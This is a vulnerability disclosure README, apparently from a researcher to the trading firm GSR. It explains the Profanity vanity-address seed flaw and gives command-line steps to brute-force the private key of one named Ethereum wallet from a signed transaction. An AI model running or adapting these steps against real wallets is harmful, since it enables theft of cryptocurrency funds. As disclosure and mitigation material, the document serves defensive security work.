
## Disclosure

Hi all, I'm Nate, a security researcher and a master's student in Cyber Security, Threat and Forensics.

I have created this private repository with the required code dependencies specifically for demonstration to provide a proof of concept for the vulnerability I am disclosing.


## Brief Introduction

Profanity is specialized software for generating Ethereum vanity addresses. It harnesses GPU capabilities using OpenCL to efficiently perform this task. The process begins by generating a random private key, then computes the corresponding public key, and ultimately derives the Ethereum address from it. This method benefits from the parallel processing capabilities of GPUs, enhancing the speed and efficiency of creating customized Ethereum addresses.

However, the issue with Profanity is that it uses a random 32-bit vector to seed 256-bit private keys, making it possible to brute-force private keys for wallets generated using this tool.

Read more about the exploit in [this blog post](https://medium.com/amber-group/exploiting-the-profanity-flaw-e986576de7ab#:~:text=Profanity%20is%20an%20Ethereum%20vanity,then%20derives%20the%20Ethereum%20address.).

# Profanity Brute-force
This tool is designed to exploit a vulnerability in the method used for generating certain vanity Ethereum addresses. It aims to reconstruct the private keys of wallets created through interfaces that utilised the Profanity tool. This vulnerability arises from specific flaws in Profanity's address generation process.

## How I Discovered This Wallet Is Affected

I reported an approval exploit in one of GSR's wallets nearly two months ago, where one of the wallets had inadvertently granted a vulnerable contract unlimited allowance to spend its holdings. I reviewed all the addresses they had [labeled on Spotonchain](https://platform.spotonchain.ai/en/entity/807) and noticed the padding style of [this particular address](https://etherscan.io/address/0x8811bfb8bb23a64f7dfa0a545654ab942dc4ad30).

I noticed the repetition of numbers and characters in the address, which led me to suspect it might have been generated using a vanity address creation interface. Prompted by this, I began examining various psotmortems of previously exploited vanity addresses. My goal was to replicate the methods used in those instances to achieve a similar outcome with this address.

I started the brute-force process on the address "0x8811BfB8BB23a64f7dFa0a545654Ab942dc4AD30" to uncover its corresponding private key, following these steps:

## Requirements
- A machine equipped with a high-performance GPU.
- A machine with a minimum of 32GB of RAM.
- A machine that will not disrupt ongoing workflows.
- A machine that is not critical for your work, as the intensive GPU usage may lead to system crashes.

### 1. Build the project
    
    $ git clone https://github.com/0xmstore/GSR
    $ cd GSR
    $ make


### 2. Compute public keys
Run the following command to precompute all seed public keys into `cache` directory.

    $ mkdir cache
    $ ./profanity.x64 -h 

### 3. Find any signed transaction

You need to have a signed transaction in order to reconstruct a public key. You can find it using [Etherscan](https://etherscan.io/).

Let's use the most recent transaction with the hash `0xaf054276bde22dbd41d05214053f24993866d2d2aab5677dcaef490788a01627` and click on `Get Raw Tx Hex` to obtain the raw transaction.

<img width="971" alt="screengrab" src="https://github.com/0xmstore/GSR/assets/99334291/65424c25-e42d-4fd4-b20b-2f75a79e3363">
 

Raw Tx Hex: `0x02f8b10109843b9aca008501ee8cd8b58301189c946e2a43be0b1d33b726f0ca3b8de60b3482b8b05080b844a9059cbb000000000000000000000000a722549ae344d5bf4333aa092c389928f286ce2b000000000000000000000000000000000000000000001fc3842bd1f071c00000c080a08ec7259af0cef057e4fdc04fa15a81ac00a39f5d0c890ed9e2db5ecf77e08fdea03f95de3f8c93bd0112852f9fa50a101853e9c1c7dbecde08d746ebcf2fba74d2`

### 4. Reconsutruct the public key

To obtain the public key from the raw transaction, utilize the `pubkey.py` script.

    $ pip install -r requirements.txt
    $ python pubkey.py -t 0x02f87201048459682f0085013d2a27d082520894000000000d1c18a47a23c5826b2567c864a7d414880328ddd5c0dafd7880c001a0c7065b5d54ebcfb3a4325bbd80e0a352500784e2b12cfee614f8ab179ef9cd479fd78e0651f4f408db5420c785204b704ac14de95b18efb913036d9845906da2

### 5. Run search

Once you have successfully recover the publickey, the next step is to run the search using the command line below

    $ ./profanity.x64 --reverse --steps 200000 --cache --target publickey

### 6. Results

This search took approximately 21 days of intermittent running of the script to be able to generate the private key  due to my MacBook M2 Pro's GPU power limitations. Successfully generating a private key signals a vulnerability. **However, if it fails to do so, it does not necessarily indicate that the wallet is safe!** You can try running step 5 with additional steps.


## Mitigation

To mitigate this issue, it's recommended to remove this wallet from your list of proprietary operational wallets. Given that anyone with sufficient resources and expertise could potentially brute-force the private key, there's a risk of unauthorised access to the funds held in this wallet.

Please let me know if any part needs further explanation or clarification.


# Disclaimer

The vulnerability details disclosed in this document are intended solely for the understanding and resolution. The information is confidential and should be treated as such, not to be disclosed or discussed outside authorised channels. It is provided in good faith to support security awarness and should not be used for any unauthorised or unlawful activities. The author assumes no liability for any actions taken by individuals or entities based on this information, and any misuse of this disclosure may be subject to legal action. All information herein have been reported responsibly and ethically to the appropriate parties.


Sincerely,
Nate
